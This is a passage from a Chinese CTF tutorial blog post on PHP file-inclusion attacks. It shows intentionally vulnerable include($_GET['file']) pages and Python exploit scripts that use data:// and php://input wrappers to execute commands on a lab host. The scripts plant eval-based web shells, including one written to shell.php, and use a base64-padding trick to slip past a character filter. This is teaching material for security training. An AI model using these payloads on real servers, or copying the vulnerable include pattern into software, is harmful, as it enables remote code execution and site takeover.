+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后使用攻击的代码执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;data://text/plain,&lt;?php phpinfo();?&gt;&#x27;</span>&#125;<br>r = requests.get(url, params=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<p>虽然这个也可以获得phpinfo但是最好还是使用URL编码之后的结果</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;data://text/plain,%3C%3Fphp%20phpinfo%28%29%3B%3F%3E&#x27;</span>&#125;<br>r = requests.get(url, params=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<p>所以响应的使用的data是可以执行php代码的</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;data://text/plain,%3C%3Fphp%20%40eval%28%24_POST%5B%22cmd%22%5D%29%3B%20%3F%3E&#x27;</span>&#125;<br>r = requests.get(url, params=data)<br>url_exp = r.url<br>payload = &#123;<span class="hljs-string">&#x27;cmd&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>&#125;<br>x = requests.post(url_exp, data=payload)<br><span class="hljs-built_in">print</span>(x.text)<br></code></pre></td></tr></table></figure>
+
+<p>接下来就是介绍另外一种方式实现data伪协议</p>
+<h5 id="data-text-plain-base64"><a href="#data-text-plain-base64" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain;base64,"></a>data:&#x2F;&#x2F;text&#x2F;plain;base64,</h5><p>可以发现这个就是比普通的plain多了一个;base64</p>
+<p>基本的使用方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain;base64,base64编码之后的php代码</span><br></code></pre></td></tr></table></figure>
+
+<p>服务端还是使用上面那个代码</p>
+<p>于是攻击的python代码也就出来了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4&#x27;</span>&#125;<br>r = requests.get(url, params=data)<br>x = r.url<br>payload = &#123;<span class="hljs-string">&#x27;cmd&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>&#125;<br><span class="hljs-built_in">print</span>(requests.post(x, data=payload).text)<br><br></code></pre></td></tr></table></figure>
+
+<p>使用这个方法有一个地方是需要注意的</p>
+<p>因为这个代码有限制使用&#x3D;和+，所以我们在bypass的时候，可以这样操作</p>
+<p>根据base64解码规则和php中base64解码宽松性，&#x3D; 在解码过程开始前会被移除，所以不会影响解码结果，但是+号作为码表的一部分移除会导致解码不正确，注意分别</p>
+<p>如果遇到+可以在代码后面加随便的字符</p>
+<p>在这里就要讲一个经典的例题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对于这个代码就很清晰了，过滤了</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"> php|<span class="hljs-string">~</span>|<span class="hljs-string">!</span>|<span class="hljs-string">@</span>|<span class="hljs-string">#</span>|<span class="hljs-string">$</span>|<span class="hljs-string">%</span>|<span class="hljs-string">^</span>|<span class="hljs-string">&amp;</span>|<span class="hljs-string">*</span>|<span class="hljs-string"> </span><br><span class="hljs-string">(</span>|<span class="hljs-string">)</span>|<span class="hljs-string">-</span>|<span class="hljs-string">_</span>|<span class="hljs-string">+</span>|<span class="hljs-string">=</span>|<span class="hljs-string">.</span><br></code></pre></td></tr></table></figure>
+
+<p>需要绕过，首先想到的是使用data伪协议</p>
+<p>值得注意的是这个代码里面过滤了&#x3D;，所以我们在进行base64编码的时候要删掉&#x3D;</p>
+<p>如果这个时候我们想使用的payload是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain;base64,&lt;?php eval($_POST[&#x27;monica&#x27;]);?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>怎么操作呢</p>
+<p><code>&lt;?php eval($_POST[&#39;monica&#39;]);?&gt;</code>这个base64编码之后的结果是<code>PD9waHAgZXZhbCgkX1BPU1RbIm1vbmljYSJdKTs/Pg==</code></p>
+<p>base64是当要编码的字符不满足4的倍数的时候会把少的字符填充为&#x3D;等于号</p>
+<p>有两个&#x3D;我在后面添加两个随便的字符是可以让&#x3D;消失的</p>
+<p>于是又了exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>php = <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;monica&quot;]);?&gt;aa&#x27;</span><br>php_base64 = base64.b64encode(php.encode()).decode()<br><span class="hljs-built_in">print</span>(php_base64)<br>data = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;data://text/plain;base64,&#x27;</span>+php_base64&#125;<br>r = requests.get(url, params=data)<br>x = r.url<br>payload = &#123;<span class="hljs-string">&#x27;monica&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>&#125;<br><span class="hljs-built_in">print</span>(requests.post(x, data=payload).text)<br></code></pre></td></tr></table></figure>
+
+<h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>现在我们开始来到了另外的一个伪协议php:&#x2F;&#x2F;input</p>
+<p>php:&#x2F;&#x2F;input 是 PHP 的内置伪协议（不是真实文件），它的核心作用是：读取 POST 请求的原始数据（不经过 PHP 解析）</p>
+<p>使用可以把POST 请求发过来的原始数据直接读取到</p>
+<p>为什么可以使用这个进行文件包含</p>
+<p>php:&#x2F;&#x2F;input 是 PHP 的内置伪协议，它并非指向真实文件，而是直接映射到本次 HTTP 请求的 POST 原始数据体（非 GET 参数，也非表单键值对的解析后数据）。当把 php:&#x2F;&#x2F;input 作为 “文件名” 传给包含函数时，PHP 会把 POST 原始数据当作 “文件内容” 读取，进而解析执行其中的 PHP 代码 —— 相当于跳过了读取服务器本地文件的步骤，直接让 PHP 执行你通过 POST 提交的任意代码。</p>
+<blockquote>
+<p>在详细的讲使用之前我们先看看注意事项</p>
+<p>enctype&#x3D;”multipart&#x2F;form-data” 时使用php:&#x2F;&#x2F;input是无效的</p>
+</blockquote>
+<p>enctype 是 HTML 表单的属性，用来指定表单数据提交的编码方式，一共有四种方式</p>
+<p><img src="/../img/file_include/1771605354884-4724d9b9-f0b5-41a4-bf4c-717fbdd015b0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li><code>application/x-www-form-urlencoded</code>：默认值，普通表单提交（键值对）；</li>
+<li><code>multipart/form-data</code>：用于上传文件（比如<code>&lt;input type=&quot;file&quot;&gt;</code>），数据会被分割成 “块” 传输。</li>
+</ul>
+<p>为什么这种编码下 php:&#x2F;&#x2F;input 无效？<br>PHP 的设计规则：<br>当 POST 请求的<code>Content-Type</code>是<code>multipart/form-data</code>（即表单设了<code>enctype=&quot;multipart/form-data</code>“）时，<code>PHP</code> 会把 POST 数据解析到$_FILES&#x2F;$_POST中，同时清空 php:&#x2F;&#x2F;input 的内容；<br>此时读取<code>php://input</code>会得到空字符串，自然无法执行你提交的代码。</p>
+<p>不过还好的是在请求的时候默认使用的是</p>
+<p>application&#x2F;x-www-form-urlencoded</p>
+<p>依旧来一个漏洞页面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>payload1 = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;php://input&#x27;</span>&#125;<br>headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;<br>r = requests.get(url, params=payload1)<br><span class="hljs-built_in">print</span>(requests.post(r.url,headers=headers,data=<span class="hljs-string">&#x27;&lt;?php system(&quot;whoami&quot;);?&gt;&#x27;</span>).text)<br></code></pre></td></tr></table></figure>
+
+<p>扩大危害方面可以写入一个木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里其实不需要执行headers，在这里我只是为了明确注意事项而已</p>
+<blockquote>
+<p>在这里还有一个注意事项，我们在使用hackerbar浏览器插件的时候，是不能使用这个方法的</p>
+</blockquote>
+<p>因为使用这个工具的话他会自己进行URL编码，导致破坏原本的文件结构，导致命令执行不了</p>
+<p>而且hackbar使用的时候，使用post提交这个功能是不能直接传没有变量的参数的</p>
+<p><img src="/../img/file_include/1771605355009-36dac773-5055-4e29-a660-cd50987dceeb.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>所以我们还是使用python或者是curl命令或者使用burp</p>
+<p><img src="/../img/file_include/1771605355069-e91cc7f7-725d-47b1-ac11-20e5295636fc.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/web%E5%AE%89%E5%85%A8/" class="category-chain-item">web安全</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="print-no-link">#网络安全</a>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="print-no-link">#渗透测试</a>
+      
+        <a href="/tags/%E6%89%8B%E6%B3%95/" class="print-no-link">#手法</a>
+      
+        <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="print-no-link">#文件包含漏洞</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>文件包含漏洞手法总结</div>
+      <div>https://exploreio.github.io/2026/04/10/file_include/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ExploreIO</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/05/ssti-sec2/" title="ssti模板注入手法总结python篇（二）">
+                        <span class="hidden-mobile">ssti模板注入手法总结python篇（二）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="margin-top: 8px; font-size: 14px; opacity: 0.7;"> <span id="vercount_value_site_pv">Loading</span> 次访问 · <span id="vercount_value_site_uv">Loading</span> 位访客 </div> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100,"easing":"ease-in-out"})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://events.vercount.one/js?i=/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start -->
+<!-- 全屏背景 -->
+<script src="/js/background.js?v=1775824038001"></script>
+
+<!-- 落雪动画 -->
+<script src="/js/snow.js?v=1775824038001"></script>
+
+<!-- 签名动画 -->
+<script src="/js/sign.js?v=1775824038001"></script>
+<link rel="stylesheet" href="/css/sign.css?v=1775824038001">
+
+<!-- 标签页标题变化 -->
+<script src="/js/title.js?v=1775824038001"></script>
+
+<!-- 文章卡片滑入动画 -->
+<script src="/js/scrollAnimation.js?v=1775824038001"></script>
+<link rel="stylesheet" href="/css/scrollAnimation.css?v=1775824038001">
+
+<!-- 网站运行时间 -->
+<script src="/js/time-insert.js?v=1775824038001"></script>
+  <!-- hexo injector body_end end --></body>
+</html>
